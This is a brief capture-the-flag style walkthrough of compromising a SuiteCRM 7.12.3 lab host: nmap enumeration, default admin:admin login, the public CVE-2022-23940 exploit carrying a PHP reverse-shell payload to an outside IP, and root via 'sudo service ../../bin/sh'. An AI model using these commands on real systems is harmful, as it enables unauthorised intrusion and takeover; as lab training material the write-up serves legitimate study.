#Pwned! 
```IP
192.168.232.146
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.232.146 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)            
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBCcfKYKMXuTWeyLKlFNHgmebcXbFAjSpbr39R8GFHYRmc/mZXKNgEoa5gkFAVr8kVVul4X6//DcnRuHtrCpHcnTIZLT9g1DPB09VsLzsjT0TpmqkcDYtZazo1mjnBZdaM+AxoDMghZd8AXiNrCl7jCN+vRjUQc8T1wD4PoC02XjeCAI8Yha++Mv9ZrSPZ+/gBv
gZPL3pdQhVGUSUHOmXod4xcdm5ReNiZRNZklOhhscbGfSCqQIdJogegZfMrlueeG3EY7Kkf5CxAUDH/9ir2dEDDifIpqKV8W7ncKEpsZiqgDh36OdMX4LPJ0NmZiT/g8CvINx7k4HWj3ksT+5C7
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)           
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEK0B9iLJQztyEpGiNffHgQuGcxZRO/BOi+r0j/P8Hkz02pIWW2hFrArbzehUNQ46ZmFwMhxxmrIOLBpUt9ZGBw=
|   256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)         
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOAlO2qlRhyMwzzf3xAK4wOGz1UD5t9+QQO5J3QjTkaZ
80/tcp    open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))     
|_http-favicon: Unknown favicon MD5: ED9A8C7810E8C9FB7035B6C3147C9A3A     
| http-cookie-flags:
|   /:
|     PHPSESSID:                                    
|_      httponly flag not set                          
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: SuiteCRM                      
|_Requested resource was index.php?action=Login&module=Users
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry  
|_/ 
3306/tcp  open  mysql   syn-ack ttl 61 MySQL (unauthorized)
33060/tcp open  mysqlx? syn-ack ttl 61
```

## HTTP 80
admin:admin
we are in

Suite CRM
Version 7.12.3
Sugar Version 6.5.25 (Build 344)
# Exploitation
https://github.com/manuelz120/CVE-2022-23940
```
python exploit.py -h http://192.168.232.146 -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.185\",4444);passthru(\"sh <&3 >&3 2>&3\");'"
```

# PrivEsc

## Manual
tty treatment
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125110748.png?raw=true)

we can use sudo service 
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125110828.png?raw=true)
with service we can access the file system without dropping privileges
```
sudo service ../../bin/sh
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125110933.png?raw=true)
we are root now
## Automated

### Peass
### Mimikatz

# Lateral Movement

